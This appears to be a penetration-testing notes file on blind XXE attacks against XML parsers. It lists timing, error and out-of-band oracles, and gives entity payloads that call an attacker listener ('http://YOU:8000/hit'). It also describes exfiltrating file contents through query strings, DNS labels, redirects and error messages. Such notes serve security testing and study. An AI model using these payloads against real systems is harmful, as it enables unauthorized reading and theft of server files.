# Blind Techniques — when nothing echoes

## The three blind flavors

1. **Echo-suppressed** — entities expand, content is read, but the
   response doesn't show it — OOB channel needed
2. **No-external** — external entities blocked — error-channel or
   local-DTD
3. **No-echo-no-external** — hardest — the error-message exfil

## The detection-without-echo — how do you even know?

The blind XXE problem: nothing echoes, so nothing in the response
changes. The signals:

- **timing** — the parser takes measurable time on an external fetch
- **error** — a failed fetch still produces an error even if content
  isn't echoed — `file:///nonexistent` produces a `FileNotFound` URI
  in the error
- **OOB-hit** — the param-entity fetch hits your listener — the
  listener IS the evidence
- **status-code** — a 500 vs 200 on an entity — the entity triggered
  a parse-path even when its content isn't shown

## The timing oracle — the egress-or-fetch oracle

```
SEND: <!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/slow-endpoint">%d;]><r/>
```

Your listener on `slow-endpoint` responds in 3s → the parser's request
takes 3s → the response takes 3s+ → egress live.

The inverse: a fetch to `http://nonexistent.invalid/` fails fast →
the request is fast → a slow-vs-fast distinction = the fetch is real.

## The error-oracle — the fetch-attempt signal

```
SEND: <!DOCTYPE r [<!ENTITY % d SYSTEM "http://nonexistent.invalid/">%d;]><r/>
```

`UnknownHostException`/`ConnectException`/`failed to load external
entity` — the error PROVES the parser tried to fetch → entities resolve
egress-blocked → local-DTD or error-channel.

## The OOB-hit-oracle — the listener as truth

```
SEND: <!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU:8000/hit">%d;]><r/>
```

The listener logs `GET /hit` — proof of: param-entity expansion +
external-DTD fetch + egress. Without echo — the hit is the only signal.

## The error-channel — in-band blind read

The `file:///nonexistent/%f;` trick — the file content lands in the
exception's URI — `errors-deep.md` — in-band without an echo-feature.

## The local-DTD-hijack — zero-egress blind read

Reuse a DTD already on disk — `local-dtd-hijack.md` — the file content
lands in the parser's error — in-band, no egress, no echo-feature.

## The "the OOB hit is a canary" — `oob_listener.py canary`

```bash
python3 tools/web/oob_listener.py canary --base http://YOU:8000/
# → emits http://YOU:8000/canary-XXXXXX/
# embed that in the payload
```

The canary-token proves the hit came from YOUR payload — shared-infra
doubt-killer.

## The "the hit has a User-Agent" — the fetcher-fingerprint

The `oob_listener` log records `User-Agent` — `Java/1.8.0_xxx`,
`Apache-HttpClient`, `libwww-perl`, `Python-urllib`, `curl` — the UA
fingerprints the parser — `parser-specifics.md`.

## The "the hit has a path/query" — the content extraction

`GET /?d=<content>` — `oob_listener hits` parses the query — the
file content lands in the log — the exfil surface.

## The "the hit is only a DNS query" — the DNS-channel

`http://%f;.YOU-DNS/` — the fetch never happens but the DNS-resolver
query does — UDP-53 listener catches the label — egress-filter-bypass.

## The "the hit is malformed" — the partial-capture

A file with `&`/`?`/`#` breaks the URL — the hit arrives truncated —
the listener sees the prefix — reassemble or slice.

## The "the hit is a 404 you generated" — the error-hop

Your listener can 302 to `http://YOU/leak?d=<content>` — the parser
follows — the redirect hop carries the content — the redirect-channel.

## The "the hit is a TCP-connect only" — the connect-oracle

Even a bare TCP-connect (no HTTP) to your listener is a signal — the
parser TRIED — egress partially open — the connect-without-request
signal.

## The "the blind-read is the timing-length" — the size oracle

A bigger file → a longer fetch → a longer request — the response-time
scales with file size — the "how big is the file" oracle without
content.

## Falsifiers

- no OOB hit, no error, no timing-diff on a known-good entity → the
  mechanism is dead → local-DTD or error-channel or class dead
